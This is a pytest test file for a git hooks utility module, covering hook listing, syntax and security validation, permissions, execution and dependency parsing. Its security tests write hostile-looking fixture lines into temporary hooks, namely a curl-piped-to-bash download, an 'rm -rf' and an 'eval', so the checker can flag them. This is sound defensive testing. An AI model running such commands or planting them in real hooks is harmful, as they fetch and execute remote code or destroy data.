"""Tests for git hooks management and validation functions."""

import os
import stat
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from coding_open_agent_tools.git.hooks import (
    analyze_hook_script,
    check_hook_executable,
    get_hook_dependencies,
    list_installed_hooks,
    parse_hook_output,
    test_hook_execution,
    validate_hook_permissions,
    validate_hook_security,
    validate_hook_syntax,
)


class TestListInstalledHooks:
    """Test list_installed_hooks function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            list_installed_hooks(123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            list_installed_hooks("")

    def test_nonexistent_path(self) -> None:
        """Test FileNotFoundError when repo_path doesn't exist."""
        with pytest.raises(FileNotFoundError, match="Repository path does not exist"):
            list_installed_hooks("/nonexistent/path/to/repo")

    def test_no_hooks_directory(self) -> None:
        """Test when .git/hooks directory doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            result = list_installed_hooks(tmpdir)
            assert result["hooks_count"] == "0"
            assert result["hooks_list"] == ""
            assert result["executable_count"] == "0"
            assert result["non_executable_count"] == "0"
            assert result["sample_count"] == "0"

    def test_with_sample_files(self) -> None:
        """Test hooks directory with .sample files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            # Create sample files
            (hooks_dir / "pre-commit.sample").touch()
            (hooks_dir / "post-commit.sample").touch()

            result = list_installed_hooks(tmpdir)
            assert result["hooks_count"] == "0"
            assert result["sample_count"] == "2"

    def test_with_executable_hooks(self) -> None:
        """Test hooks directory with executable hooks."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            # Create executable hook
            hook_file = hooks_dir / "pre-commit"
            hook_file.touch()
            hook_file.chmod(0o755)

            result = list_installed_hooks(tmpdir)
            assert result["hooks_count"] == "1"
            assert result["executable_count"] == "1"
            assert result["non_executable_count"] == "0"
            assert "pre-commit" in result["hooks_list"]

    def test_with_non_executable_hooks(self) -> None:
        """Test hooks directory with non-executable hooks."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            # Create non-executable hook
            hook_file = hooks_dir / "pre-commit"
            hook_file.touch()
            hook_file.chmod(0o644)

            result = list_installed_hooks(tmpdir)
            assert result["hooks_count"] == "1"
            assert result["executable_count"] == "0"
            assert result["non_executable_count"] == "1"


class TestValidateHookSyntax:
    """Test validate_hook_syntax function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            validate_hook_syntax(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            validate_hook_syntax("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            validate_hook_syntax("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            validate_hook_syntax("/tmp", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                validate_hook_syntax(tmpdir, "pre-commit")

    def test_hook_without_shebang(self) -> None:
        """Test hook file without shebang."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("echo 'test'\n")

            result = validate_hook_syntax(tmpdir, "pre-commit")
            assert result["has_shebang"] == "false"
            assert result["shell_type"] == "unknown"

    @patch("subprocess.run")
    def test_valid_bash_script(self, mock_run: Mock) -> None:
        """Test valid bash script with shebang."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")

            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            result = validate_hook_syntax(tmpdir, "pre-commit")
            assert result["is_valid"] == "true"
            assert result["shell_type"] == "bash"
            assert result["has_shebang"] == "true"

    @patch("subprocess.run")
    def test_invalid_bash_syntax(self, mock_run: Mock) -> None:
        """Test bash script with syntax error."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\nif [ test\n")

            mock_run.return_value = Mock(
                returncode=1,
                stdout="",
                stderr="pre-commit: line 2: syntax error"
            )

            result = validate_hook_syntax(tmpdir, "pre-commit")
            assert result["is_valid"] == "false"
            assert "syntax error" in result["error_message"]

    @patch("subprocess.run")
    def test_timeout_handling(self, mock_run: Mock) -> None:
        """Test timeout handling in syntax validation."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")

            mock_run.side_effect = subprocess.TimeoutExpired("bash", 5)

            result = validate_hook_syntax(tmpdir, "pre-commit")
            assert result["is_valid"] == "false"
            assert "timed out" in result["error_message"]

    def test_python_script(self) -> None:
        """Test Python script detection."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/usr/bin/env python\nprint('test')\n")

            result = validate_hook_syntax(tmpdir, "pre-commit")
            assert result["shell_type"] == "python"
            assert result["has_shebang"] == "true"


class TestValidateHookSecurity:
    """Test validate_hook_security function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            validate_hook_security(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            validate_hook_security("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            validate_hook_security("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            validate_hook_security("/tmp", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                validate_hook_security(tmpdir, "pre-commit")

    def test_safe_hook(self) -> None:
        """Test hook with no security issues."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'Safe script'\n")

            result = validate_hook_security(tmpdir, "pre-commit")
            assert result["is_safe"] == "true"
            assert result["issues_count"] == "0"

    def test_hook_with_eval(self) -> None:
        """Test hook with eval command."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\neval $COMMAND\n")

            result = validate_hook_security(tmpdir, "pre-commit")
            assert result["is_safe"] == "false"
            assert int(result["issues_count"]) > 0
            assert "eval" in result["dangerous_commands"]

    def test_hook_with_rm_rf(self) -> None:
        """Test hook with rm -rf command."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\nrm -rf /tmp/test\n")

            result = validate_hook_security(tmpdir, "pre-commit")
            assert result["is_safe"] == "false"
            assert "rm -rf" in result["dangerous_commands"]

    def test_hook_with_curl_pipe(self) -> None:
        """Test hook with curl piped to shell."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\ncurl http://example.com | bash\n")

            result = validate_hook_security(tmpdir, "pre-commit")
            assert result["is_safe"] == "false"
            assert result["has_user_input"] == "false"

    def test_hook_with_user_input(self) -> None:
        """Test hook that uses user input."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\nread -p 'Enter value: ' VALUE\n")

            result = validate_hook_security(tmpdir, "pre-commit")
            assert result["has_user_input"] == "true"


class TestCheckHookExecutable:
    """Test check_hook_executable function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            check_hook_executable(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            check_hook_executable("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            check_hook_executable("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            check_hook_executable("/tmp", "")

    def test_nonexistent_path(self) -> None:
        """Test FileNotFoundError when repo_path doesn't exist."""
        with pytest.raises(FileNotFoundError, match="Repository path does not exist"):
            check_hook_executable("/nonexistent/path", "pre-commit")

    def test_hook_file_not_exist(self) -> None:
        """Test when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            result = check_hook_executable(tmpdir, "pre-commit")
            assert result["is_executable"] == "false"
            assert result["file_exists"] == "false"
            assert result["permissions"] == "000"

    def test_executable_hook(self) -> None:
        """Test hook with executable permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o755)

            result = check_hook_executable(tmpdir, "pre-commit")
            assert result["is_executable"] == "true"
            assert result["file_exists"] == "true"
            assert result["owner_can_execute"] == "true"

    def test_non_executable_hook(self) -> None:
        """Test hook without executable permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o644)

            result = check_hook_executable(tmpdir, "pre-commit")
            assert result["is_executable"] == "false"
            assert result["file_exists"] == "true"
            assert result["owner_can_execute"] == "false"


class TestAnalyzeHookScript:
    """Test analyze_hook_script function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            analyze_hook_script(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            analyze_hook_script("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            analyze_hook_script("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            analyze_hook_script("/tmp", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                analyze_hook_script(tmpdir, "pre-commit")

    def test_simple_hook(self) -> None:
        """Test analysis of simple hook."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")

            result = analyze_hook_script(tmpdir, "pre-commit")
            # Line count includes shebang, echo line, and trailing newline
            assert int(result["line_count"]) >= 2
            # Shebang is counted as a comment
            assert result["has_comments"] == "true"

    def test_hook_with_error_handling(self) -> None:
        """Test hook with error handling."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\nset -e\necho 'test'\n")

            result = analyze_hook_script(tmpdir, "pre-commit")
            assert result["has_error_handling"] == "true"

    def test_hook_with_comments(self) -> None:
        """Test hook with comments."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\n# Comment\necho 'test'\n")

            result = analyze_hook_script(tmpdir, "pre-commit")
            assert result["has_comments"] == "true"

    def test_hook_with_external_commands(self) -> None:
        """Test hook with external commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\ngit status\ngrep test file.txt\n")

            result = analyze_hook_script(tmpdir, "pre-commit")
            assert "git" in result["external_commands"]
            assert "grep" in result["external_commands"]


class TestTestHookExecution:
    """Test test_hook_execution function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            test_hook_execution(123, "pre-commit", "")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            test_hook_execution("/tmp", 123, "")  # type: ignore

    def test_invalid_test_args_type(self) -> None:
        """Test TypeError when test_args is not a string."""
        with pytest.raises(TypeError, match="test_args must be a string"):
            test_hook_execution("/tmp", "pre-commit", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            test_hook_execution("", "pre-commit", "")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            test_hook_execution("/tmp", "", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                test_hook_execution(tmpdir, "pre-commit", "")

    def test_non_executable_hook(self) -> None:
        """Test execution of non-executable hook."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o644)

            result = test_hook_execution(tmpdir, "pre-commit", "")
            assert result["can_execute"] == "false"
            assert "not executable" in result["stderr"]

    @patch("subprocess.run")
    def test_successful_execution(self, mock_run: Mock) -> None:
        """Test successful hook execution."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o755)

            mock_run.return_value = Mock(
                returncode=0,
                stdout="test output",
                stderr=""
            )

            result = test_hook_execution(tmpdir, "pre-commit", "")
            assert result["can_execute"] == "true"
            assert result["exit_code"] == "0"

    @patch("subprocess.run")
    def test_timeout_handling(self, mock_run: Mock) -> None:
        """Test timeout handling in hook execution."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o755)

            mock_run.side_effect = subprocess.TimeoutExpired("hook", 30)

            result = test_hook_execution(tmpdir, "pre-commit", "")
            assert result["can_execute"] == "false"
            assert "timed out" in result["stderr"]


class TestParseHookOutput:
    """Test parse_hook_output function."""

    def test_invalid_hook_output_type(self) -> None:
        """Test TypeError when hook_output is not a string."""
        with pytest.raises(TypeError, match="hook_output must be a string"):
            parse_hook_output(123)  # type: ignore

    def test_empty_output(self) -> None:
        """Test parsing empty output."""
        result = parse_hook_output("")
        assert result["has_errors"] == "false"
        assert result["has_warnings"] == "false"
        assert result["error_count"] == "0"
        assert result["warning_count"] == "0"

    def test_output_with_errors(self) -> None:
        """Test parsing output with errors."""
        output = "error: something went wrong\nfatal: critical issue"
        result = parse_hook_output(output)
        assert result["has_errors"] == "true"
        assert int(result["error_count"]) == 2

    def test_output_with_warnings(self) -> None:
        """Test parsing output with warnings."""
        output = "warning: deprecated usage\nwarn: please update"
        result = parse_hook_output(output)
        assert result["has_warnings"] == "true"
        assert int(result["warning_count"]) == 2

    def test_mixed_output(self) -> None:
        """Test parsing output with both errors and warnings."""
        output = "error: failed\nwarning: deprecated\ninfo: message"
        result = parse_hook_output(output)
        assert result["has_errors"] == "true"
        assert result["has_warnings"] == "true"
        assert int(result["error_count"]) >= 1
        assert int(result["warning_count"]) >= 1


class TestValidateHookPermissions:
    """Test validate_hook_permissions function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            validate_hook_permissions(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            validate_hook_permissions("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            validate_hook_permissions("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            validate_hook_permissions("/tmp", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                validate_hook_permissions(tmpdir, "pre-commit")

    def test_secure_permissions(self) -> None:
        """Test hook with secure permissions."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o755)

            result = validate_hook_permissions(tmpdir, "pre-commit")
            assert result["is_secure"] == "true"
            assert result["is_writable_by_group"] == "false"
            assert result["is_writable_by_others"] == "false"

    def test_group_writable(self) -> None:
        """Test hook writable by group."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o775)

            result = validate_hook_permissions(tmpdir, "pre-commit")
            assert result["is_secure"] == "false"
            assert result["is_writable_by_group"] == "true"

    def test_world_writable(self) -> None:
        """Test hook writable by others."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")
            hook_file.chmod(0o777)

            result = validate_hook_permissions(tmpdir, "pre-commit")
            assert result["is_secure"] == "false"
            assert result["is_writable_by_others"] == "true"


class TestGetHookDependencies:
    """Test get_hook_dependencies function."""

    def test_invalid_repo_path_type(self) -> None:
        """Test TypeError when repo_path is not a string."""
        with pytest.raises(TypeError, match="repo_path must be a string"):
            get_hook_dependencies(123, "pre-commit")  # type: ignore

    def test_invalid_hook_name_type(self) -> None:
        """Test TypeError when hook_name is not a string."""
        with pytest.raises(TypeError, match="hook_name must be a string"):
            get_hook_dependencies("/tmp", 123)  # type: ignore

    def test_empty_repo_path(self) -> None:
        """Test ValueError when repo_path is empty."""
        with pytest.raises(ValueError, match="repo_path cannot be empty"):
            get_hook_dependencies("", "pre-commit")

    def test_empty_hook_name(self) -> None:
        """Test ValueError when hook_name is empty."""
        with pytest.raises(ValueError, match="hook_name cannot be empty"):
            get_hook_dependencies("/tmp", "")

    def test_hook_file_not_exist(self) -> None:
        """Test FileNotFoundError when hook file doesn't exist."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            with pytest.raises(FileNotFoundError, match="Hook file does not exist"):
                get_hook_dependencies(tmpdir, "pre-commit")

    def test_hook_with_no_dependencies(self) -> None:
        """Test hook with no dependencies."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho 'test'\n")

            result = get_hook_dependencies(tmpdir, "pre-commit")
            assert result["has_dependencies"] == "false"
            assert result["dependencies_count"] == "0"

    def test_hook_with_commands(self) -> None:
        """Test hook with external commands."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\ngit status\npython script.py\n")

            result = get_hook_dependencies(tmpdir, "pre-commit")
            assert result["has_dependencies"] == "true"
            assert "git" in result["commands"]
            assert "python" in result["commands"]

    def test_hook_with_env_vars(self) -> None:
        """Test hook with environment variables."""
        with tempfile.TemporaryDirectory() as tmpdir:
            hooks_dir = Path(tmpdir) / ".git" / "hooks"
            hooks_dir.mkdir(parents=True)

            hook_file = hooks_dir / "pre-commit"
            hook_file.write_text("#!/bin/bash\necho $CUSTOM_VAR\necho $ANOTHER_VAR\n")

            result = get_hook_dependencies(tmpdir, "pre-commit")
            assert "CUSTOM_VAR" in result["env_vars"]
            assert "ANOTHER_VAR" in result["env_vars"]
            # Standard vars should be filtered out
            assert "PATH" not in result["env_vars"]
